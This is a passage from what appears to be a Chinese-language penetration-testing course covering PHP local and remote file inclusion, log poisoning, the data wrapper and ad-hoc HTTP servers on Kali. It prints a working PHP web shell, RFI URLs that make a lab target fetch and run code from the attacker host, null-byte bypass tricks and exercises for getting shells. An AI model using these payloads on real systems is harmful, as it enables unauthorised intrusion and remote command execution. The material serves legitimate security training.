

那么，这里究竟发生了什么？由于该应用程序使用了 PHP 的 **include** 语句，并且我们能够指定要包含的文件（清单 295），被污染的 **access.log** 文件的内容就被网页执行了。

PHP 引擎接着执行日志文件文本中的 `<?php echo shell_exec($_GET['cmd']);?>` 部分（即我们的攻击载荷），其中 **cmd** 变量的值为“**ipconfig**”，这实际上是在目标系统上运行了 **ipconfig** 并显示其输出结果。日志文件中的其他行只是被原样显示，因为它们不包含有效的 PHP 代码。

这显然不是开发人员的本意！

既然我们已经展示了如何通过日志文件投毒来获取代码执行权限，那么我们应该能够在系统上获取一个 shell。我们将把这一任务留给读者作为练习。

## 9.4.4.5 练习

- 1. 通过利用 LFI（本地文件包含）攻击获得代码执行权限。
- 2. 利用获得的代码执行权限获取完整的 shell 权限。

## 9.4.4.6 远程文件包含（RFI）

远程文件包含（RFI）漏洞比 LFI（本地文件包含）漏洞更为少见，因为服务器必须按照非常特定的方式进行配置，但 RFI 漏洞通常更容易利用。例如，PHP 应用程序必须将 **allow_url_include** 设置为“On”（开启）。旧版本的 PHP 默认将此选项设置为开启，但新版本默认设置为“Off”（关闭）。如果我们能强制网络应用程序加载并执行远程文件中的代码，我们在创建利用载荷时将拥有更大的灵活性。

让我们来看一个 RFI 漏洞的例子。之前演示的 LFI 漏洞同样容易受到 RFI 攻击。请考虑以下情况：

```
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
```

清单 300 - 使用 file 参数尝试 RFI 载荷

此请求将强制 PHP web 服务器尝试从我们的 Kali 攻击机中加载一个远程文件。我们可以通过在 Kali 机器上启动一个 netcat 监听器，然后在 Windows 10 目标上提交该 URL 来测试这一点：

```
kali@kali:~$ sudo nc -nlvp 80
listening on [any] 80 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50324
GET /evil.txt HTTP/1.0
Host: 10.11.0.4
Connection: close
```

清单 301 - 使用 Netcat 监听器验证 RFI

输出结果表明，当提交 URL 时，Windows 10 机器确实尝试联系我们的 Kali 机器以获取 **evil.txt** 文件。如果成功获取了该文件，它还将进一步尝试包含并执行该文件。

虽然这是一个简单的例子，但该 URL 是有效的且流程正在运行，这本质上允许我们加载并执行托管在远程 web 服务器上的任何文件。

> 旧版本的 PHP 存在一个漏洞，即空字符（null byte）[^278]（%00）会终止任何字符串。这个技巧可用于绕过服务器端添加的文件扩展名，并且对于文件包含非常有用，因为它防止将文件扩展名视为字符串的一部分。换句话说，如果应用程序读取某个参数并在其后附加 "php"，那么通过参数传入的空字符实际上会在字符串中添加 ".php" 扩展名之前结束字符串。这赋予了攻击者更大的灵活性，可以使用文件包含漏洞加载哪些文件。

> 对于 RFI 载荷的另一个技巧是在末尾加上问号 (?)，这将服务器端添加到 URL 中的任何内容标记为查询字符串的一部分。

为了查看其实际效果，我们可以配置我们的 Apache 服务器以托管一个恶意的 **evil.txt** 文件，其中包含我们在日志投毒攻击中使用的相同 PHP 命令 shell。创建文件后，我们将通过快速重启来刷新 Apache：

```
kali@kali:/var/www/html$ cat evil.txt
<?php echo shell_exec($_GET['cmd']); ?>

kali@kali:/var/www/html$ sudo systemctl restart apache2
```

清单 302 - 创建 RFI 载荷并启动 Apache

一旦文件就位且 web 服务器正在运行，我们就可以向 Windows 10 机器上存在漏洞的网络应用程序发送我们的 RFI 攻击 URL，并查看我们的代码是否执行：

```
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
```

清单 303 - 利用 RFI 漏洞

![](img/ec25e59d75726b7041242a56d3376832_317_0.png)

很好。利用成功了。我们的代码从远程服务器被包含并成功执行。这是一个非常简单的 *webshell*（Web 后门）。

[^278]: (The PHP Group, 2019), https://www.php.net/manual/en/security.filesystem.nullbytes.php

![](img/ec25e59d75726b7041242a56d3376832_318_0.png)

Webshell 是一小块软件，它提供基于 Web 的命令行界面，使执行命令变得更加简单和方便。有很多类型的 webshells，Kali 在 /usr/share/webshells 中包含了几种，它们是用许多常见的 Web 应用程序编程语言编写的。一如既往，在使用这些文件之前，请审查其内容。

基于这些简单示例的成功，我们可以使用 Apache（或其他 HTTP 服务器）来托管这些 shell 用于 RFI，从而扩展我们的能力。

现在既然我们能够在服务器上执行代码，借助 Kali Linux 附带的 webshells，从代码执行到获取 shell 应该是件简单的事。

## 9.4.4.7 练习

- 1. 利用网络应用程序中的 RFI 漏洞并获取 shell。
- 2. 使用 /menu2.php?file=current_menu 作为起点，利用 RFI 获取 shell。
- 3. 使用 Kali 附带的其中一个 webshell 在 Windows 10 目标上获取 shell。

## 9.4.4.8 扩展你的技能库

既然我们已经走完了基础知识部分，让我们看看一些扩展技能库的方法。

首先，让我们看看一些 Apache 的替代方案。

Kali 包含几个可以创建 HTTP 服务器的工具。如果我们需要在任意端口上快速启动 HTTP 服务器，这特别有用。

> 请注意，以下示例使用的是注册端口，但如果我们以 root 用户权限运行命令，也可以在系统端口上运行服务器。

例如，我们可以通过设置 --m SimpleHTTPServer 来设置所需模块，并设置 7331 来设置 TCP 端口，从而在 Python 2.x 中在任意端口上启动 HTTP 服务器：

```
kali@kali:~$ python -m SimpleHTTPServer 7331
Serving HTTP on 0.0.0.0 port 7331 ...
```

清单 304 - 使用 Python 2 在端口 7331 上运行 HTTP 服务器

Python 3.x 的语法略有不同，因为模块名称不同：

```
kali@kali:~$ python3 -m http.server 7331
Serving HTTP on 0.0.0.0 port 7331 (http://0.0.0.0:7331/) ...
```

清单 305 - 使用 Python 3 在端口 7331 上运行 HTTP 服务器

这两个命令都会启动一个 HTTP 服务器，并托管当前工作路径下的任何文件或目录。

PHP 包含一个内置的 web 服务器，可以通过 -S 标志后跟要使用的地址和端口来启动：

```
kali@kali:~$ php -S 0.0.0.0:8888
PHP 7.3.8-1 Development Server started at Wed Aug 28 12:59:52 2019
```

```
Listening on http://0.0.0.0:8888
Document root is /home/kali
Press Ctrl-C to quit.
```

清单 306 - 使用 PHP 在端口 8888 上运行 HTTP 服务器

我们还可以使用 Ruby“单行命令”启动 HTTP 服务器。该命令需要几个标志，包括 `–run` 用于加载 `un.rb`（其中包含常见 Unix 命令的替代方案），`–e httpd` 用于运行 HTTP 服务器，`.` 用于从当前目录提供内容，以及 `–p 9000` 用于设置 TCP 端口。

```
kali@kali:~$ ruby –run –e httpd . –p 9000
[2019-08-28 12:44:14] INFO WEBrick 1.4.2
[2019-08-28 12:44:14] INFO ruby 2.5.5 (2019-03-15) [x86_64-linux-gnu]
[2019-08-28 12:44:14] INFO WEBrick::HTTPServer#start: pid=1367 port=9000
```

清单 307 - 使用 Ruby 在端口 9000 上运行 HTTP 服务器

我们还可以使用 `busybox`（“嵌入式 Linux 的多功能瑞士军刀”）运行 HTTP 服务器，使用 `httpd` 作为功能，`–f` 用于交互运行，`–p 10000` 用于在 TCP 端口 10000 上运行：

```
kali@kali:~$ busybox httpd –f –p 10000
```

清单 308 - 使用 BusyBox 在端口 10000 上运行 HTTP 服务器

要停止其中任何一个服务器，我们只需按下 **Ctrl C** 即可。

接下来，让我们讨论一下 PHP 包装器。

## 9.4.4.9 PHP 包装器

PHP 提供了几种协议包装器 [^279]，我们可以使用它们来利用目录遍历和文件包含漏洞。这些过滤器在我们试图通过 LFI 漏洞注入 PHP 代码时提供了额外的灵活性。

我们可以使用 [^280] 包装器将内联数据作为 URL 的一部分嵌入，使用明文或 base64 [^281] 编码数据。当我们无法向本地文件注入 PHP 代码时，这个包装器为我们提供了一种替代的载荷。

让我们更仔细地看看如何使用 data 包装器。它以“data:”开头，后跟数据类型。在这种情况下，我们将使用“text/plain”表示明文。然后我们用逗号标记内容的开始，在这里是“hello world”。当我们将它们全部组合在一起时，就得到“data:text/plain,hello world”。

我们已经知道菜单页容易受到 LFI 攻击。如果我们提交一个使用 data 包装器的载荷，应用程序应该将其视为常规文件并将其包含在页面中。让我们通过提交以下 URL 并检查结果来验证是否有效：

```
http://10.11.0.22/menu.php?file=data:text/plain,hello world
```

清单 309 - 使用 data 包装器的测试载荷

[^279]: (The PHP Group, 2019), https://www.php.net/manual/en.wrappers.php
[^280]: (The PHP Group, 2019), https://www.php.net/manual/en/wrappers.data.php
[^281]: (Wikipedia, 2019), https://en.wikipedia.org/wiki/Base64

